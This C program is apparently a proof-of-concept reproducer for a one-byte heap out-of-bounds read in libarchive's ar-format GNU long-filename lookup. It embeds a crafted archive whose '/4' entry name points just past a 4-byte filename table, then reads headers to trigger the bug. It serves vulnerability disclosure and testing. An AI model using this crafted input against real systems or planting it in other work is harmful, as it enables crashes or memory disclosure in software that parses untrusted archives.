#include <archive.h>
#include <archive_entry.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * PoC for a 1-byte heap-buffer-overflow read in the "ar" format reader's
 * GNU filename-table lookup (archive_read_support_format_ar.c).
 *
 * The archive contains a "//" GNU filename table of 4 bytes, followed by
 * a regular entry whose name is "/4" - a GNU long-filename reference to
 * offset 4, i.e. exactly one byte past the end of the 4-byte table. A
 * correctly bounds-checked reader must reject this reference; instead it
 * resolves it by indexing one byte past the table's heap allocation and
 * treating whatever follows as a NUL-terminated string.
 */

static const unsigned char ar_data[] = {
    /* "!<arch>\n" global header */
    '!','<','a','r','c','h','>','\n',

    /* "//" GNU filename table header (60 bytes) */
    '/','/',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',
    '0',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',
    '0',' ',' ',' ',' ',' ',
    '0',' ',' ',' ',' ',' ',
    '1','0','0','6','4','4',' ',' ',
    '4',' ',' ',' ',' ',' ',' ',' ',' ',' ',
    '`','\n',

    /* filename table content: "x/\n`" (4 bytes, even size) */
    'x','/','\n','`',

    /* regular file entry header, name "/4" (one past the 4-byte table) */
    '/','4',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',
    '0',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',
    '0',' ',' ',' ',' ',' ',
    '0',' ',' ',' ',' ',' ',
    '1','0','0','6','4','4',' ',' ',
    '3',' ',' ',' ',' ',' ',' ',' ',' ',' ',
    '`','\n',

    /* file contents */
    'h','i','\n',
};

int main(void)
{
    struct archive *a;
    struct archive_entry *ae;
    int r;

    a = archive_read_new();
    archive_read_support_format_ar(a);

    r = archive_read_open_memory(a, ar_data, sizeof(ar_data));
    if (r != ARCHIVE_OK) {
        fprintf(stderr, "open_memory failed: %s\n", archive_error_string(a));
        return 1;
    }

    /* First header: the "//" filename table (not exposed as an entry). */
    r = archive_read_next_header(a, &ae);
    /* Second header: the "/4" entry - triggers the OOB lookup. */
    r = archive_read_next_header(a, &ae);
    if (r == ARCHIVE_OK)
        printf("pathname: %s\n", archive_entry_pathname(ae));
    else
        printf("read_next_header: %d (%s)\n", r, archive_error_string(a));

    archive_read_free(a);
    return 0;
}
